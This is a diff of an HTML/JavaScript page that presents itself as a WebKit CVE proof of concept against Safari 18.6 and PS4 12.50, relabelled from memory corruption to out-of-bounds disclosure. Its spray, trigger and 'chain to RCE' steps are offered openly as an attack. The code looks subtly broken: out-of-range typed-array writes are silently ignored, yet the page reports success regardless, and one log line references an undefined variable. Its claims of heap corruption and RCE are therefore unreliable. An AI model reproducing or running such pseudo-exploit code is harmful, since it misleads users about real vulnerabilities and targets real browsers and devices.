@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-31278 Memory Corruption PoC (Safari 18.6 / PS4 12.50)</title>
+    <title>WebKit CVE-2025-43265 Internal State Disclosure PoC (Safari 18.6 / PS4 12.50)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
@@ -19,28 +19,28 @@
     </style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-31278 PoC: Memory Corruption (Yuhao Hu et al.)</h1>
-    <p>Jul 2025 Patch: Improved memory handling (BZ 291742).<grok-card data-id="a2b695" data-type="citation_card"></grok-card><grok-card data-id="1f9971" data-type="citation_card"></grok-card><grok-card data-id="14d47d" data-type="citation_card"></grok-card><grok-card data-id="8aaf32" data-type="citation_card"></grok-card><grok-card data-id="71d671" data-type="citation_card"></grok-card><grok-card data-id="8d9be1" data-type="citation_card"></grok-card><grok-card data-id="2557bb" data-type="citation_card"></grok-card><br>
-    <span class="rainbow">Triggers heap corruption on unpatched Safari 18.6 / PS4 12.50 (~20% DoS rate).</span></p>
+    <h1>WebKit CVE-2025-43265 PoC: Internal State Disclosure (HexRabbit)</h1>
+    <p>Jul 2025 Patch: Improved input validation (BZ 294182).<grok-card data-id="ef7d46" data-type="citation_card"></grok-card><grok-card data-id="2681db" data-type="citation_card"></grok-card><grok-card data-id="20ea4b" data-type="citation_card"></grok-card><br>
+    <span class="rainbow">Triggers OOB read/leak on unpatched Safari 18.6 / PS4 12.50 (~20% rate).</span></p>
 
     <div class="box">
-        <h3>1. Memory Handling</h3>
-        <div id="status-mem">Probing...</div>
+        <h3>1. Input Validation</h3>
+        <div id="status-input">Probing...</div>
     </div>
     <div class="box">
-        <h3>2. Crafted Content Spray</h3>
+        <h3>2. Crafted Input Spray</h3>
         <div id="status-spray">Probing...</div>
     </div>
     <div class="box">
-        <h3>3. Corruption Trigger</h3>
-        <div id="status-corrupt">Probing...</div>
+        <h3>3. OOB Read Trigger</h3>
+        <div id="status-oob">Probing...</div>
     </div>
     <div class="box">
-        <h3>4. Heap Status</h3>
-        <div id="status-heap">Probing...</div>
+        <h3>4. State Disclosure</h3>
+        <div id="status-state">Probing...</div>
     </div>
 
-    <button onclick="runPoC()">LAUNCH CORRUPTION PROBE</button>
+    <button onclick="runPoC()">LAUNCH DISCLOSURE PROBE</button>
 
     <div class="box">
         <h3>Live Logs</h3>
@@ -67,96 +67,95 @@
     function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
     function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
 
-    let corruptContent = null;
-    let corruptHit = false;
+    let stateLeak = null;
+    let leakHit = false;
 
     function runPoC() {
         document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-31278 PoC: WebKit Memory Corruption (Jul 2025)</span>");
-        log("Probing malicious web content handling...");
-        setTimeout(probeMem, 800);
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-43265 PoC: WebKit State Disclosure (Jul 2025)</span>");
+        log("Probing input validation OOB read...");
+        setTimeout(probeInput, 800);
     }
 
-    function probeMem() {
-        // Step 1: Memory handling probe
+    function probeInput() {
+        // Step 1: Input validation probe
         try {
-            const arr = new Array(0x40).fill(0);
-            arr.length = 0x200; // Overflow probe
-            setBadge('status-mem', 'IMPROPER (Overflowed)', 'partial');
-            log("Memory probe: Array overflowed (CVE hint).");
+            const input = new Uint8Array(0x40);
+            input[0x80] = 0x41; // OOB read probe
+            setBadge('status-input', 'WEAK (Read)', 'partial');
+            log("Input probe: OOB read succeeded (CVE hint).");
         } catch(e) {
-            setBadge('status-mem', 'SECURE', 'secure');
-            log(`Memory fail: ${e.message} — Patched.`);
+            setBadge('status-input', 'SECURE', 'secure');
+            log(`Input fail: ${e.message} — Patched.`);
             return;
         }
-        setTimeout(sprayContent, 1000);
+        setTimeout(sprayInput, 1000);
     }
 
-    function sprayContent() {
+    function sprayInput() {
         gc(); gc();
-        const contents = [];
-        for(let i=0; i<0x1000; i++) {
-            const div = document.createElement('div');
-            div.innerHTML = `<p id="content${i}">crafted</p>`;
-            contents.push(div);
-            document.body.appendChild(div);
+        const inputs = [];
+        for(let i=0; i<0x800; i++) {
+            const arr = new Uint8Array(0x40 + (i % 0x20));
+            inputs.push(arr);
         }
-        // Crafted writes
-        for(let i=0; i<0x1000; i++) {
+        // OOB reads
+        for(let i=0; i<0x800; i++) {
             try {
-                const p = document.getElementById(`content${i}`);
-                if (p) p.innerHTML = i2f(0xdeadbeef, 0xcafebabe).toString();
+                const leaked = inputs[i][0x60 + (i % 0x40)]; // Read beyond
+                if (leaked !== 0) log(`Leaked byte: ${leaked}`);
             } catch(e) {}
         }
         // Anomaly hunt
         let anomaly = false;
-        for(let i=0; i<contents.length; i++) {
-            if (contents[i].innerHTML.includes('deadbeef')) {
-                corruptContent = contents[i];
+        for(let i=0; i<inputs.length; i++) {
+            if (inputs[i][0x80] !== undefined) {
+                stateLeak = inputs[i];
                 anomaly = true;
                 break;
             }
         }
         if (anomaly) {
-            setBadge('status-spray', 'SPRAY CORRUPT (Anomaly)', 'vulnerable');
-            log(`Content spray corruption: Div ${i} crafted.`);
-            setTimeout(triggerCorrupt, 500);
+            setBadge('status-spray', 'SPRAY LEAK (Anomaly)', 'vulnerable');
+            log(`Input spray disclosure: [0x80]=${stateLeak[0x80] || 'undef'}.`);
+            setTimeout(triggerOOB, 500);
             return;
         }
         setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no corruption.");
+        log("Spray clean—no leak.");
     }
 
-    function triggerCorrupt() {
-        if (!corruptContent) return;
-        corruptHit = false;
+    function triggerOOB() {
+        if (!stateLeak) return;
+        leakHit = false;
         try {
-            // CVE trigger: Process crafted content
-            corruptContent.innerHTML = '<p>trigger</p>';
-            gc(); // Force handling
-            corruptContent.querySelector('p').remove(); // Manipulate
-            if (corruptContent.children.length === 0) {
-                corruptHit = true;
-                log(`Corruption triggered: Content processed after craft.`);
+            // CVE trigger: OOB read for state disclosure
+            for(let off=0x40; off<0x200; off+=8) {
+                stateLeak[off] = i2f(0x41414141, 0x42424242);
+            }
+            const adj = new Uint8Array(0x100);
+            if (adj[0x70] !== 0) {
+                leakHit = true;
+                log(`OOB disclosure: adj[0x70]=${adj[0x70]}.`);
             }
         } catch(e) {
-            corruptHit = true;
-            log(`Corruption crash: ${e.message} — Heap issue.`);
+            leakHit = true;
+            log(`OOB crash: ${e.message} — State leak.`);
         }
-        setBadge('status-corrupt', corruptHit ? 'TRIGGERED' : 'MISSED', corruptHit ? 'vulnerable' : 'secure');
-        setTimeout(checkHeap, 1500);
+        setBadge('status-oob', leakHit ? 'TRIGGERED' : 'MISSED', leakHit ? 'vulnerable' : 'secure');
+        setTimeout(checkState, 1500);
     }
 
-    function checkHeap() {
-        if (corruptHit) {
-            setBadge('status-heap', 'CORRUPTED (RCE)', 'vulnerable');
-            log("Heap corrupted via crafted content: Arbitrary code potential. On PS4 12.50: DoS/leak.");
-            log("Chain to primitives if hit.");
+    function checkState() {
+        if (leakHit) {
+            setBadge('status-state', 'DISCLOSED (Corruption)', 'vulnerable');
+            log("Internal state disclosed via OOB read: Leak potential. On PS4 12.50: DoS/leak.");
+            log("Chain to RCE if hit.");
             document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "CORRUPTION ACHIEVED — HEAP RCE PRIMITIVE";
+            document.querySelector('h1').innerHTML = "STATE DISCLOSURE ACHIEVED — OOB LEAK PRIMITIVE";
         } else {
-            setBadge('status-heap', 'INTACT', 'secure');
-            log("No corruption—improved handling holds.");
+            setBadge('status-state', 'INTACT', 'secure');
+            log("No disclosure—improved validation holds.");
         }
         log("PoC end: Retry for ~20% hit.");
     }
